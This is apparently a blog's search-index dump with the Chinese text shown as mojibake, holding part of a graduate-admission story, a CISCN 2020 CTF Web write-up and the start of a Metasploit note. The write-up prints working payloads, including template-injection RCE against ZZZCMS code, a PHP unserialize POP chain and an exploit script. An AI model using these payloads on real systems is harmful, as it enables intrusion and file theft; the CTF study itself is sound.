¡ï¼ˆå±±ä¸œå¤§å­¦ç½‘ç»œå®‰å…¨å­¦é™¢ã€æ­å·ç”µå­ç§‘æŠ€å¤§å­¦ç½‘ç»œå®‰å…¨å­¦é™¢ç­‰ï¼‰ï¼Œä½†æˆ‘è¿˜æ˜¯æ›´æƒ³ç•™ç€å·å†…ï¼Œäºæ˜¯è”ç³»äº†ç”µç§‘çš„ç¬¬ä¸€ä½è€å¸ˆï¼Œè·Ÿè€å¸ˆé€šäº†ä¸ªç”µè¯ï¼Œè¯´äº†å“ˆè‡ªå·±çš„åŸºæœ¬æƒ…å†µï¼Œè€å¸ˆçº¦æˆ‘å»ç”µå­ç§‘æŠ€å¤§å­¦é¢è°ˆï¼Œæˆ‘æŒ‰ç…§çº¦å®šæ—¶é—´å»äº†ç”µç§‘å—é—¨ï¼Œç”±äºç–«æƒ…åŸå› è¿›ä¸äº†æ ¡ï¼Œæˆ‘å’Œè€å¸ˆåœ¨ç”µç§‘é—¨å£èŠäº†ä¸€ä¼šï¼Œè€å¸ˆè¯´è”ç³»ä»–çš„äººå¾ˆå¤šï¼Œè®©æˆ‘å›å»ç­‰ç­”å¤ã€‚å›å»åè®©ä¸“ä¸šè€å¸ˆå¸®å¿™é—®äº†å“ˆæƒ…å†µï¼Œç”µç§‘è€å¸ˆç»™æˆ‘çš„å›å¤æ˜¯â€œæˆ‘å¾ˆå¥½ï¼Œä½†æ˜¯ä¸é€‚åˆä»–ä»¬å›¢é˜Ÿâ€ï¼ˆåº”è¯¥è¿˜æ˜¯è‡ªå·±å®åŠ›ä¸å¤Ÿï¼‰ï¼Œç¬¬ä¸€æ¬¡é¢è¯•å°±æ­¤å‘Šç»ˆã€‚ç„¶åè”ç³»äº†ç¬¬äºŒä½ç”µç§‘è€å¸ˆï¼ŒåŠ äº†è€å¸ˆå¾®ä¿¡ï¼Œè·Ÿè€å¸ˆçº¦äº†æ—¶é—´è§†é¢‘é€šè¯ï¼Œåé¢è€å¸ˆç»™æˆ‘æ‰“äº†è¯­éŸ³ç”µè¯ï¼ŒèŠäº†ä¸€äº›åŸºæœ¬æƒ…å†µï¼Œé—®äº†ä¸€äº›ä¸“ä¸šçŸ¥è¯†ï¼Œè€å¸ˆæœ€åè¯´åŒæ„æ¥æ”¶æˆ‘ï¼ˆå“‡ï¼Œå½“æ—¶æ¿€åŠ¨åäº†ï¼‰ï¼Œè€å¸ˆè®©æˆ‘æŒ‰ç…§æ­£å¸¸æµç¨‹æ¥å°±å¯ä»¥äº†ï¼Œäºæ˜¯æˆ‘å°±æ²¡æœ‰å†è”ç³»å…¶ä»–å­¦æ ¡å’Œå¯¼å¸ˆäº†ã€‚\n\n#### æ‹¿åˆ°æœ¬æ ¡æ¨å…èµ„æ ¼\n\n9æœˆ23å·æœ¬æ ¡ç ”ç©¶ç”Ÿå®˜ç½‘æ‹Ÿæ¨èå…è¯•æ”»è¯»ç¡•å£«ç ”ç©¶ç”Ÿèµ„æ ¼åå•ï¼Œé¡ºåˆ©çš„è¯ï¼Œä½ å°±å¯ä»¥åœ¨åå•ä¸Šçœ‹åˆ°è‡ªå·±çš„åå­—å•¦ã€‚\n\n#### é¢„æ¨å…\n\n9æœˆ24æ—¥ç”µç§‘è®¡ç®—æœºå­¦é™¢å‡ºäº†â€œ2021å¹´æ¥æ”¶ä¼˜ç§€åº”å±Šæœ¬ç§‘æ¯•ä¸šç”Ÿå…è¯•æ”»è¯»ç ”ç©¶ç”Ÿå·¥ä½œå®‰æ’é€šçŸ¥â€ï¼ŒæŒ‰ç…§ä¸Šé¢çš„è¦æ±‚å‘é‚®ç®±æäº¤ææ–™ï¼Œåœ¨ç”µç§‘æ¨å…ç³»ç»Ÿä¸Šå¡«æŠ¥ä¿¡æ¯ï¼Œå¡«å†™å®Œä¹‹åæ³¨æ„æŸ¥çœ‹å›å¤å’Œç³»ç»Ÿå˜åŒ–ï¼Œé€šçŸ¥ä¸Šé¢è¿˜ä¼šæœ‰å¤è¯•æ—¶é—´å’Œå¤è¯•è€ƒæŸ¥å†…å®¹ï¼Œæ¥ä¸‹æ¥çš„æ—¶é—´å‡†å¤‡é¢„æ¨å…é¢è¯•å°±å¯ä»¥å•¦ã€‚\n\n#### å‚åŠ é¢„æ¨å…å¤è¯•\n\nå› ä¸ºç–«æƒ…ï¼Œä»Šå¹´å¤è¯•æ˜¯ç½‘ç»œé¢è¯•ï¼Œéœ€è¦åŒæœºä½ï¼Œ10æœˆ9æ—¥ä¸¾è¡Œäº†å¤è¯•æµ‹è¯•ï¼Œè€å¸ˆä¼šè·Ÿä½ æµ‹è¯•ç½‘ç»œè®¾å¤‡æ˜¯å¦æ­£å¸¸ï¼ˆéŸ³æ•ˆå¾ˆä¸å¥½ï¼Œè¿˜æœ‰å›éŸ³ï¼‰ï¼Œå¹¶è·Ÿä½ è¯´æ˜å¤è¯•æµç¨‹ï¼Œ10æœˆ10æ—¥æ­£å¼é¢è¯•ï¼Œæˆ‘è¿æ°”ç»äº†ï¼ŒæŠ½åˆ°äº†ç¬¬ä¸€ä¸ªé¢è¯•ï¼Œç´§å¼ æ­»æˆ‘äº†ï¼ŒéŸ³æ•ˆåˆä¸å¥½ï¼Œå¾ˆéš¾å—ã€‚é¢è¯•é¦–å…ˆæ˜¯ç¡®è®¤èº«ä»½ï¼Œç„¶åæ­£å¼å¼€å§‹ï¼Œé¦–å…ˆæŠ•å±pptè¿›è¡Œè‡ªæˆ‘ä»‹ç»ï¼Œç„¶åæ˜¯è‹±è¯­é¢è¯•ï¼Œè€å¸ˆé—®äº†æˆ‘ä¸¤ä¸ªé—®é¢˜ï¼Œä¸€ä¸ªæ˜¯ä¸ºä»€ä¹ˆé€‰æ‹©ç”µå­ç§‘æŠ€å¤§å­¦ï¼Œå¦ä¸€ä¸ªæ˜¯å‘å¥¹ä»‹ç»ä¸€å“ˆæˆ‘çš„ä¼˜åŠ¿ï¼Œæ¥ä¸‹æ¥æ˜¯ä¸“ä¸šé¢è¯•ï¼Œè€å¸ˆæŠ•å±è®©æˆ‘é€‰æ‹©ä¸€ä¸ªwordæ–‡æ¡£ï¼Œæˆ‘é€‰äº†ä¸€ä¸ªï¼Œæ‰“å¼€æ˜¯ä¸€é“å½’å¹¶æ’åºçš„ç®—æ³•é¢˜ï¼Œé¢˜ç›®å°±æœ‰ A4 çº¸çš„ 2/3ï¼ˆå½“æ—¶ä¸€è„¸æ‡µï¼‰ï¼Œè¿‡åº¦ç´§å¼ çš„æˆ‘ï¼Œå½“æ—¶è„‘å­ä¸€ç‰‡ç©ºç™½ï¼Œå›ç­”å¾—å¹¶ä¸å¥½ã€‚æœ€åæ˜¯ç»¼åˆé¢è¯•ï¼Œè€å¸ˆæ ¹æ®æˆ‘çš„ç®€å†å’Œæˆ‘å¯¼å¸ˆç ”ç©¶æ–¹å‘é—®äº†ä¸€ç³»åˆ—é—®é¢˜ã€‚é¢å®Œæ„Ÿè§‰å¾ˆå·®ï¼Œéƒ½ç­”å¾—ä¸å¥½ã€‚10æœˆ11æ—¥ä¸‹åˆä¸€ç‚¹å¤šä¸€ç‚¹å‡ºäº†å½•å–é€šçŸ¥ï¼Œè¢«è°ƒå‰‚åˆ°äº†ä¸“ç¡•ï¼ˆå¯¼å¸ˆè¯´ï¼šä¸“ç¡•å­¦ç¡•åŒºåˆ«ä¸å¤§ï¼‰ï¼Œä½†æ˜¯å½•å–äº†ï¼Œè¿˜æ˜¯å¾ˆå¼€å¿ƒçš„ï¼Œè‡³å°‘æœ‰ä¹¦è¯»äº†ã€‚\n\n#### å¡«æŠ¥æ¨å…ç³»ç»Ÿ\n\nå¿—æ„¿å¡«æŠ¥ç³»ç»Ÿæ˜¯10æœˆ12æ—¥0ç‚¹å¼€æ”¾ï¼Œä¸ªäººåŸºæœ¬ä¿¡æ¯å’Œå¤è¯•ç¼´è´¹åœ¨10å·å¼€é€šï¼Œç”µç§‘è¦æ±‚12å·9ç‚¹åŠä¹‹å‰å¡«å¥½ï¼Œæˆ‘11å·æ™šä¸Šç†¬å¤œå°±å¡«å¥½äº†å¿—æ„¿ï¼Œ12å·æ—©ä¸Š10ç‚¹æ”¶åˆ°äº†ç”µç§‘çš„å¤è¯•é€šçŸ¥ï¼ˆåªæ˜¯ä¸€ä¸ªæµç¨‹è€Œå·²ï¼‰ï¼Œæˆ‘ç«‹é©¬ç‚¹å‡»äº†ç¡®è®¤ï¼Œå¿«12ç‚¹çš„æ—¶å€™æ”¶åˆ°äº†ç”µç§‘çš„æ‹Ÿå½•å–é€šçŸ¥ï¼Œç‚¹å®Œæ¥å—ä¿ç ”å°±å‘Šä¸€æ®µè½äº†ã€‚\n\n![](https://img.jwt1399.top//img/20201013104207.png)\n\n### ç»éªŒåˆ†äº«\n\n1.æå‰åšå¥½**ä¸ªäººç®€å†**å’Œ**ä¸ªäººä»‹ç»PPT**ï¼Œé‡ç‚¹çªå‡ºè‡ªå·±åœ¨æœ¬ç§‘çš„ç§‘ç ”å¥–é¡¹ï¼Œç»©ç‚¹æ’åï¼Œå®ä¹ ç»å†ã€ç¼–ç¨‹èƒ½åŠ›ç­‰ï¼Œè¦è®©é¢è¯•è€å¸ˆç›´è§‚çœ‹åˆ°ä½ çš„ä¼˜åŠ¿ã€‚\n\n2.ç†Ÿæ‚‰å¤§ä¸€åˆ°å¤§ä¸‰çš„**ä¸“ä¸šè¯¾**ï¼Œå°¤å…¶æ˜¯è·Ÿä½ ä»¥åæ–¹å‘ç›¸å…³çš„çŸ¥è¯†ï¼Œæ•°æ®ç»“æ„ä¸ç®—æ³•ã€Cè¯­è¨€ã€è®¡ç®—æœºç½‘ç»œã€æ“ä½œç³»ç»Ÿã€æ•°æ®åº“ã€è®¡ç®—æœºç»„æˆåŸç†è¿™äº›éƒ½æ˜¯å¾ˆé‡è¦çš„ï¼Œé¢è¯•ä¹Ÿä¼šé—®åˆ°ç›¸å…³çŸ¥è¯†ã€‚\n\n3.è®¤çœŸå¯¹å¾…**é¢è¯•**ï¼Œèƒ½ä¸èƒ½æˆåŠŸå½•å–å°±çœ‹é¢è¯•äº†ï¼Œæ‰€ä»¥ä¸€å®šè¦åšå¥½å……åˆ†çš„å‰æœŸå‡†å¤‡ï¼Œæ‰èƒ½è„±é¢–è€Œå‡ºï¼Œæ‹¿åˆ°å¥½çš„é¢è¯•æˆç»©ã€‚æå‰æ’ç»ƒä¸€æ®µè‡ªæˆ‘ä»‹ç»ï¼ŒæŸ¥é˜…ä¸€äº›åŸºç¡€ä¸“ä¸šçŸ¥è¯†ï¼Œè‡ªå·±æ„Ÿå…´è¶£çš„ç ”ç©¶æ–¹å‘ç­‰ï¼Œåœ¨é¢è¯•è¿‡ç¨‹ä¸­ï¼Œè€å¸ˆå¾ˆå¤§å¯èƒ½ä¼šé—®åˆ°ä¸“ä¸šç›¸å…³çš„çŸ¥è¯†ï¼Œè¿˜æœ‰ä¸€å®šè¦è°ƒæ•´å¥½è‡ªå·±çš„å¿ƒæ€ï¼Œä¸è¦è¿‡äºç´§å¼ ï¼Œä»å®¹é¢è¯•ï¼Œè¯­é€Ÿæ”¾æ…¢ï¼Œè®©è€å¸ˆæ„Ÿè§‰ä½ æ˜¯ä¸€ä¸ªç¨³é‡çš„äººã€‚åæ­£ä¸€å®šè¦åšå¥½å‰æœŸå‡†å¤‡ï¼ï¼æœºä¼šæ€»æ˜¯ç•™ç»™æœ‰å‡†å¤‡çš„äººï¼ï¼ï¼\n\n4.æœ€å¥½å¤§ä¸‰æš‘å‡å°±å‚åŠ **ä¿ç ”å¤ä»¤è¥**ï¼Œæ‹¿åˆ°ä¼˜ç§€è¥å‘˜åŸºæœ¬å°±ç¨³äº†ï¼ˆä¸æ’é™¤ä¸ªåˆ«å­¦æ ¡é¸½ï¼‰ï¼Œæˆ‘æ˜¯å› ä¸ºè‹±è¯­é—®é¢˜ï¼Œæ‰€ä»¥æ²¡æœ‰å‚åŠ å¤ä»¤è¥ã€‚\n\n### å†™åœ¨åé¢\n\nå¸Œæœ›æˆ‘çš„ç»éªŒèƒ½å¤Ÿç»™æƒ³ä¿ç ”çš„å­¦å¼Ÿå­¦å¦¹ä»¬ä¸€äº›å¸®åŠ©ï¼Œå…¶å®ä¿ç ”å¹¶ä¸éš¾ï¼Œéš¾çš„æ˜¯æœ‰äº†ç›®æ ‡ï¼Œæ€ä¹ˆæ ·åšå’Œæ€ä¹ˆåšæŒä¸‹æ¥ã€‚å¤§å­¦å››å¹´æ—¶å…‰å¾ˆå¿«ï¼Œä¿ç ”æœ€é‡è¦è¿˜æ˜¯çœ‹å¤§ä¸€åˆ°å¤§ä¸‰è¿™ä¸‰å¹´çš„ä¸“ä¸šç»©ç‚¹ï¼Œå¸Œæœ›å­¦å¼Ÿå­¦å¦¹ä»¬èƒ½å¤Ÿæ—©ä¸€ç‚¹ç¡®å®šè‡ªå·±çš„æ–¹å‘ï¼Œæ‰ä¼šæœ‰æ›´å¤šçš„å¯èƒ½æ€§ã€‚\n\n### å½•å–é€šçŸ¥ä¹¦\n\n2021å¹´7æœˆ2å·æ›´æ–°ï¼šä»Šå¤©æ”¶åˆ°äº†å­¦æ ¡å¯„æ¥çš„å½•å–é€šçŸ¥ä¹¦ï¼Œä»Šå¹´çš„å½•å–é€šçŸ¥ä¹¦æ”¹ç‰ˆäº†ï¼Œæ¯”åŸæ¥çš„å¥½ä¸€ç‚¹äº†ã€‚\n\n| ![å½•å–é€šçŸ¥ä¹¦](https://img.jwt1399.top//img/20210706193644.jpg) | ![é€šçŸ¥ä¹¦åˆé›†](https://img.jwt1399.top//img/20210706193650.jpg) |\n| ------------------------------------------------------------ | ------------------------------------------------------------ |\n\n## èµåŠ©ğŸ’°\n\nå¦‚æœä½ è§‰å¾—å¯¹ä½ æœ‰å¸®åŠ©ï¼Œä½ å¯ä»¥è¯·æˆ‘å–ä¸€æ¯å†°å¯ä¹ï¼å˜»å˜»ğŸ¤­\n\n<table>\n  <tbody>\n     <tr>\n         <td style=\"text-align:center;\">æ”¯ä»˜å®æ”¯ä»˜</td>\n         <td style=\"text-align:center;\">å¾®ä¿¡æ”¯ä»˜</td>\n     </tr>\n   <tr>\n    <td style=\"text-align:center;\" ><img width=\"200\" src=\"https://jwt1399.top/medias/reward/alipay.png\"></td>    \n      <td style=\"text-align:center;\"><img width=\"200\" src=\"https://jwt1399.top/medias/reward/wechat.png\"></td>     \n  </tr>\n</tbody></table>","tags":["ä¿ç ”","ç»éªŒåˆ†äº«"],"categories":["Share"]},{"title":"2020CISCN-åˆèµ›Web","url":"/posts/17919.html","content":"\nä¸å‡ºæ„å¤–ï¼Œè¿™åº”è¯¥æ˜¯æœ€åä¸€æ¬¡æ‰“å›½èµ›äº†ï¼Œæ€»å…±22é“é¢˜ï¼Œè§£å‡º15é“é¢˜ï¼ŒWebä¸€å…±5é“é¢˜ï¼Œæœ€ååšå‡º4é“é¢˜ï¼Œå®éªŒå®¤çš„ä¸¤æ”¯é˜Ÿä¼ï¼Œæœ€ç»ˆè¥¿å—èµ›åŒºç¬¬6å’Œç¬¬10ï¼Œå…¨å›½ç¬¬35å’Œ53ï¼ŒæˆåŠŸæ™‹çº§åˆ†åŒºèµ›ã€‚\n\n## easyphp\n\n**è€ƒç‚¹ï¼šPHPå¤šçº¿ç¨‹**\n\n**é¢˜ç›®æºç ï¼š**\n\n```php\n<?php\n    //é¢˜ç›®ç¯å¢ƒï¼šphp:7.4.8-apache\n    $pid = pcntl_fork();\n    if ($pid == -1) {\n        die('could not fork');//åˆ›å»ºå¤±è´¥å°±é€€å‡º\n    }else if ($pid){ //ä»è¿™é‡Œå¼€å§‹å†™çš„ä»£ç æ˜¯çˆ¶è¿›ç¨‹çš„\n        $r=pcntl_wait($status);//ç­‰å¾…æˆ–è¿”å›forkçš„å­è¿›ç¨‹çŠ¶æ€\n        if(!pcntl_wifexited($status)){//æ£€æŸ¥å­è¿›ç¨‹çŠ¶æ€ä»£ç æ˜¯å¦ä»£è¡¨æ­£å¸¸é€€å‡ºã€‚\n            phpinfo();\n        }\n    }else{//å­è¿›ç¨‹\n        highlight_file(__FILE__);\n        if(isset($_GET['a'])&&is_string($_GET['a'])&&!preg_match(\"/[:\\\\\\\\]|exec|pcntl/i\",$_GET['a'])){\n            call_user_func_array($_GET['a'],[$_GET['b'],false,true]);//è°ƒç”¨å›è°ƒå‡½æ•°ï¼Œå¹¶æŠŠä¸€ä¸ªæ•°ç»„å‚æ•°ä½œä¸ºå›è°ƒå‡½æ•°çš„å‚æ•°\n        }\n        posix_kill(posix_getpid(), SIGUSR1);\n    }\n```\n\nè®©å­è¿›ç¨‹å¼‚å¸¸é€€å‡ºï¼Œè¿›å…¥åˆ°phpinfoä¸­\n\n**Payload:**\n\n```php\n?a=call_user_func&b=pcntl_waitpid \n```\n\næ‰§è¡Œå call_user_func_array() å°±å˜æˆ pcntl_waitpid(false,true)ï¼Œå­è¿›ç¨‹å˜ä¸ºåƒµå°¸è¿›ç¨‹ï¼Œç„¶åç¬¦åˆelse if æ‰§è¡Œphpinfoï¼Œä»è€Œå¾—åˆ°flag\n\n![](https://img.jwt1399.top//img/20200825112819.png)\n\n## easytrick\n\n**è€ƒç‚¹:PHPå¼±ç±»å‹ã€ååºåˆ—åŒ–ã€PHPç²¾åº¦é—®é¢˜**\n\n**é¢˜ç›®æºç ï¼š**\n\n```php\n<?php \nclass trick{ \n    public $trick1; \n    public $trick2; \n    public function __destruct(){ \n        $this->trick1 = (string)$this->trick1; \n        if(strlen($this->trick1) > 5 || strlen($this->trick2) > 5){ \n            die(\"ä½ å¤ªé•¿äº†\"); \n        } \n        if($this->trick1 !== $this->trick2 && md5($this->trick1) === md5($this->trick2) && $this->trick1 != $this->trick2){ \n            echo file_get_contents(\"/flag\"); \n        } \n    } \n} \nhighlight_file(__FILE__); \nunserialize($_GET['trick']); \n```\n\né¢˜ç›®è¦æ±‚ trick1 å’Œ trick2 çš„å€¼å’Œç±»å‹éƒ½ä¸èƒ½ç›¸ç­‰ï¼Œtrick1 å’Œ trick2 é•¿åº¦å°äº5ï¼Œå¹¶ä¸”è¦è®© trick1 å’Œ trick2 çš„ md5 å€¼ç›¸ç­‰\n\n**EXPï¼š**\n\n```php\n<?php \nclass trick{\n    public $trick1 = 0.01;\n\tpublic $trick2 = 0.1*0.1;\n}\n$exp = new trick();\necho serialize($exp); \n?>\n```\n\n**Payload:**\n\n```php\nO:5:\"trick\":2:{s:6:\"trick1\";d:0.01;s:6:\"trick2\";d:0.010000000000000002;} \n```\n\n![](https://img.jwt1399.top//img/20200825110028.png)\n\næ»¡è¶³æ‰€æœ‰æ¡ä»¶ï¼ŒæˆåŠŸ bypass ,è·å¾— flag\n\n![](https://img.jwt1399.top//img/20200825104524.png)\n\n## rceme\n\n**è€ƒç‚¹ï¼šæ¨¡æ¿æ³¨å…¥ã€RCE**\n\n**é¢˜ç›®æºç ï¼š**\n\n```php\n<?php \nerror_reporting(0); \nhighlight_file(__FILE__); \nparserIfLabel($_GET['a']); \nfunction danger_key($s) { \n    $s=htmlspecialchars($s); \n    $key=array('php','preg','server','chr','decode','html','md5','post','get','request','file','cookie','session','sql','mkdir','copy','fwrite','del','encrypt','$','system','exec','shell','open','ini_','chroot','eval','passthru','include','require','assert','union','create','func','symlink','sleep','ord','str','source','rev','base_convert');\n    $s = str_ireplace($key,\"*\",$s); \n    $danger=array('php','preg','server','chr','decode','html','md5','post','get','request','file','cookie','session','sql','mkdir','copy','fwrite','del','encrypt','$','system','exec','shell','open','ini_','chroot','eval','passthru','include','require','assert','union','create','func','symlink','sleep','ord','str','source','rev','base_convert');\n    foreach ($danger as $val){ \n        if(strpos($s,$val) !==false){ \n            die('å¾ˆæŠ±æ­‰ï¼Œæ‰§è¡Œå‡ºé”™ï¼Œå‘ç°å±é™©å­—ç¬¦ã€'.$val.'ã€‘'); \n        } \n    } \n    if(preg_match(\"/^[a-z]$/i\")){ \n        die('å¾ˆæŠ±æ­‰ï¼Œæ‰§è¡Œå‡ºé”™ï¼Œå‘ç°å±é™©å­—ç¬¦'); \n    } \n    return $s; \n} \nfunction parserIfLabel( $content ) { \n    $pattern = '/\\{if:([\\s\\S]+?)}([\\s\\S]*?){end\\s+if}/'; \n    if ( preg_match_all( $pattern, $content, $matches ) ) { \n        $count = count( $matches[ 0 ] ); \n        for ( $i = 0; $i < $count; $i++ ) { \n            $flag = ''; \n            $out_html = ''; \n            $ifstr = $matches[ 1 ][ $i ]; \n            $ifstr=danger_key($ifstr,1); \n            if(strpos($ifstr,'=') !== false){ \n                $arr= splits($ifstr,'='); \n                if($arr[0]=='' || $arr[1]==''){ \n                    die('å¾ˆæŠ±æ­‰ï¼Œæ¨¡æ¿ä¸­æœ‰é”™è¯¯çš„åˆ¤æ–­,è¯·ä¿®æ­£ã€'.$ifstr.'ã€‘'); \n                } \n                $ifstr = str_replace( '=', '==', $ifstr ); \n            } \n            $ifstr = str_replace( '<>', '!=', $ifstr ); \n            $ifstr = str_replace( 'or', '||', $ifstr ); \n            $ifstr = str_replace( 'and', '&&', $ifstr ); \n            $ifstr = str_replace( 'mod', '%', $ifstr ); \n            $ifstr = str_replace( 'not', '!', $ifstr ); \n            if ( preg_match( '/\\{|}/', $ifstr)) { \n                die('å¾ˆæŠ±æ­‰ï¼Œæ¨¡æ¿ä¸­æœ‰é”™è¯¯çš„åˆ¤æ–­,è¯·ä¿®æ­£'.$ifstr); \n            }else{ \n                @eval( 'if(' . $ifstr . '){$flag=\"if\";}else{$flag=\"else\";}' ); \n            } \n \n            if ( preg_match( '/([\\s\\S]*)?\\{else\\}([\\s\\S]*)?/', $matches[ 2 ][ $i ], $matches2 ) ) { \n                switch ( $flag ) { \n                    case 'if': \n                        if ( isset( $matches2[ 1 ] ) ) { \n                            $out_html .= $matches2[ 1 ]; \n                        } \n                        break; \n                    case 'else': \n                        if ( isset( $matches2[ 2 ] ) ) { \n                            $out_html .= $matches2[ 2 ]; \n                        } \n                        break; \n                } \n            } elseif ( $flag == 'if' ) { \n                $out_html .= $matches[ 2 ][ $i ]; \n            } \n            $pattern2 = '/\\{if([0-9]):/'; \n            if ( preg_match( $pattern2, $out_html, $matches3 ) ) { \n                $out_html = str_replace( '{if' . $matches3[ 1 ], '{if', $out_html ); \n                $out_html = str_replace( '{else' . $matches3[ 1 ] . '}', '{else}', $out_html ); \n                $out_html = str_replace( '{end if' . $matches3[ 1 ] . '}', '{end if}', $out_html ); \n                $out_html = $this->parserIfLabel( $out_html ); \n            } \n            $content = str_replace( $matches[ 0 ][ $i ], $out_html, $content ); \n        } \n    } \n    return $content; \n} \nfunction splits( $s, $str=',' ) { \n    if ( empty( $s ) ) return array( '' ); \n    if ( strpos( $s, $str ) !== false ) { \n        return explode( $str, $s ); \n    } else { \n        return array( $s ); \n    } \n}\n```\n\næœç´¢å‘ç°æ˜¯ZZZCMSæºç çš„ä¸€éƒ¨åˆ†\n\nå‚è€ƒï¼š[[zzzcms(php) v1.7.5 å‰å°RCE-å¤ç°](https://forum.90sec.com/t/topic/1239)](https://cloud.tencent.com/developer/article/1576196)\n\n**Payload:**\n\n```php\n?a={if:print_r(`ls /`)}{end if}\n?a={if:print_r(`cat /flag`)}{end if}\n```\n\n![](https://img.jwt1399.top//img/20200825110523.png)\n\n## babyunserialize\n\n**è€ƒç‚¹ï¼špop chainæ„é€ ã€ååºåˆ—åŒ–gadgetä¸²è”**\n\nä½¿ç”¨å¾¡å‰‘è¿›è¡Œç›®å½•æ‰«æå‘ç°`www.zip`ï¼Œå­˜åœ¨æºç æ³„éœ²,æ‰“å¼€åå‘ç°æ˜¯fatfreeæ¡†æ¶ï¼Œè¿›è¡Œä»£ç å®¡è®¡\n\nPHPè·¯ç”±ï¼š\n\n```php\n$f3->route('GET /',\n    function($f3) {\n        echo \"may be you need /?flag=\";\n    }\n);\nunserialize($_GET['flag']);\n```\n\nå‘ç°é¢˜ç›®ç»™äº†ä¸€ä¸ªååºåˆ—åŒ–ä½ç½®ï¼Œä¸”å‚æ•°å¯æ§ã€‚\n\nåšäº†å¾ˆä¹…éƒ½æ²¡æ€è·¯ï¼Œæœåˆ°[2020WMCTF-webweb](https://www.4hou.com/posts/vD7X)ç±»ä¼¼çš„é¢˜,ä½†æ˜¯è¿˜æ˜¯æ²¡åšå‡ºæ¥ï¼Œé˜Ÿå‹æœ€åç»™çš„æ„é€ æ–¹æ³•ã€‚\n\n```php\n<?php\nnamespace DB\\SQL {\n    class Mapper {\n        protected $props;\n        function __construct($props)\n        {\n            $this->props = $props;\n        }\n    }\n}\n\nnamespace CLI {\n    class Agent{\n        protected $server;\n        protected $socket;\n        function __construct($server,$socket)\n        {\n            $this->server = $server;\n            $this->socket= $socket;\n        }\n\n    }\n\n    class WS{\n        protected $events = [];\n        function __construct($events)\n        {\n            $this->events = $events;\n        }\n    }\n}\n\nnamespace {\n    class Image{\n        public $events = [];\n        function __construct($events)\n        {\n            $this->events = $events;\n        }\n    }\n\n    $a = new DB\\SQL\\Mapper(array(\"write\"=>\"create_function\"));\n    $b= new CLI\\Agent($a,'){}readfile(\"/tmp/ffff1l1l1a449g\");//');\n    $c = new Image(array(\"disconnect\"=>array($b,'send')));\n    $d = new CLI\\Agent($c,'');\n    $e = new CLI\\WS($d);\n    echo urlencode(serialize($e)).\"\\n\";\n}\n?>\n```\n\n**EXPï¼š**\n\n```python\nimport requests\n\nurl = 'http://eci-2ze4mvter6u3r6rigbk1.cloudeci1.ichunqiu.com/?flag='\npayload = 'O%3A6%3A%22CLI%5CWS%22%3A1%3A%7Bs%3A9%3A%22%00%2A%00events%22%3BO%3A9%3A%22CLI%5CAgent%22%3A2%3A%7Bs%3A9%3A%22%00%2A%00server%22%3BO%3A5%3A%22Image%22%3A1%3A%7Bs%3A6%3A%22events%22%3Ba%3A1%3A%7Bs%3A10%3A%22disconnect%22%3Ba%3A2%3A%7Bi%3A0%3BO%3A9%3A%22CLI%5CAgent%22%3A2%3A%7Bs%3A9%3A%22%00%2A%00server%22%3BO%3A13%3A%22DB%5CSQL%5CMapper%22%3A1%3A%7Bs%3A8%3A%22%00%2A%00props%22%3Ba%3A1%3A%7Bs%3A5%3A%22write%22%3Bs%3A15%3A%22create_function%22%3B%7D%7Ds%3A9%3A%22%00%2A%00socket%22%3Bs%3A37%3A%22%29%7B%7Dreadfile%28%22%2Ftmp%2Fffff1l1l1a449g%22%29%3B%2F%2F%22%3B%7Di%3A1%3Bs%3A4%3A%22send%22%3B%7D%7D%7Ds%3A9%3A%22%00%2A%00socket%22%3Bs%3A0%3A%22%22%3B%7D%7D'\nurl_all = url+payload\nr = requests.get(url_all)\nprint (r.content)\n```\n\n![](https://img.jwt1399.top//img/20200825115752.png)\n\n## littlegame\n\nè¿™é“é¢˜æ²¡æœ‰åšå‡ºæ¥ã€‚ã€‚ã€‚\n\n## èµåŠ©ğŸ’°\n\nå¦‚æœä½ è§‰å¾—å¯¹ä½ æœ‰å¸®åŠ©ï¼Œä½ å¯ä»¥è¯·æˆ‘å–ä¸€æ¯å†°å¯ä¹ï¼å˜»å˜»ğŸ¤­\n\n<table>\n  <tbody>\n     <tr>\n         <td style=\"text-align:center;\">æ”¯ä»˜å®æ”¯ä»˜</td>\n         <td style=\"text-align:center;\">å¾®ä¿¡æ”¯ä»˜</td>\n     </tr>\n   <tr>\n    <td style=\"text-align:center;\" ><img width=\"200\" src=\"https://jwt1399.top/medias/reward/alipay.png\"></td>    \n      <td style=\"text-align:center;\"><img width=\"200\" src=\"https://jwt1399.top/medias/reward/wechat.png\"></td>     \n  </tr>\n</tbody></table>","tags":["Write-up","CISCN"],"categories":["CTF"]},{"title":"Metasploit å­¦ä¹ è®°å½•","url":"/posts/42826.html","content":"\nä¸€ç›´åœ¨ç”¨ Metasploitï¼Œä½†æ˜¯ä»æ¥æ²¡æœ‰èŠ±æ—¶é—´ä»”ç»†å»ç ”ç©¶è¿™ä¸ªå·¥å…·ï¼Œæœ€è¿‘å¾—ç©ºå°±ç³»ç»Ÿçš„ç ”ç©¶ç ”ç©¶ï¼Œæ•…äºæ­¤è®°å½•ä¹‹ã€‚\n\n## ç®€ä»‹\n\nMetasploitæ˜¯ä¸€æ¬¾å¼€æºçš„æ¸—é€æµ‹è¯•æ¡†æ¶å¹³å°ï¼ŒMSFå·²ç»å†…ç½®äº†æ•°åƒä¸ªå·²æŠ«éœ²çš„æ¼æ´ç›¸å…³çš„æ¨¡å—å’Œæ¸—é€æµ‹è¯•å·¥å…·ï¼Œæ¨¡å—ä½¿ç”¨rubyè¯­è¨€ç¼–å†™ã€‚\n\nå®˜ç½‘ï¼šhttps://www.metasploit.com/\n\n## Metasploitä½“ç³»æ¡†æ¶\n\n### ä½“ç³»æ¡†æ¶å›¾\n\n![Metasploitä½“ç³»æ¡†æ¶](https://img.jwt1399.top//img/20200811215048.png)\n\n\n\n### **åŸºç¡€åº“æ–‡ä»¶**\n\n> MetasploitåŸºç¡€åº“æ–‡ä»¶ä½äºæºç æ ¹ç›®å½•è·¯å¾„ä¸‹çš„ `libraries` ç›®å½•ä¸­ï¼ŒåŒ…æ‹¬ `Rex`ï¼Œ`framework-core`å’Œ`framework-base` ä¸‰éƒ¨åˆ†ã€‚\n\n- **Rexï¼ˆRuby 